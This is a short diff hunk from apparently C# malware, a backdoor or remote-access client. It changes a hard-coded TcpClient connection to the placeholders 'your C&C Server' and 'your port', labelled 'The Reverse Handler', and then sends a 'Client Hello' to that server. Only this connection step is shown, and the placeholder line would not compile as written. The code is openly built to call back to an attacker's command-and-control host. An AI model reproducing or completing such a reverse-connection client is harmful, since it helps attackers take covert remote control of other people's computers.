@@ -121,7 +121,7 @@ namespace ds
 
             TcpClient tcpint = new TcpClient();
             bool Auth = false;
-            tcpint.Connect("192.168.1.2",8080);
+            tcpint.Connect("your C&C Server", your port); // The Reverse Handler....
             Byte[] sBytes = Encoding.ASCII.GetBytes("Client Hello");
             int requestCount = 0;
             requestCount = 0;
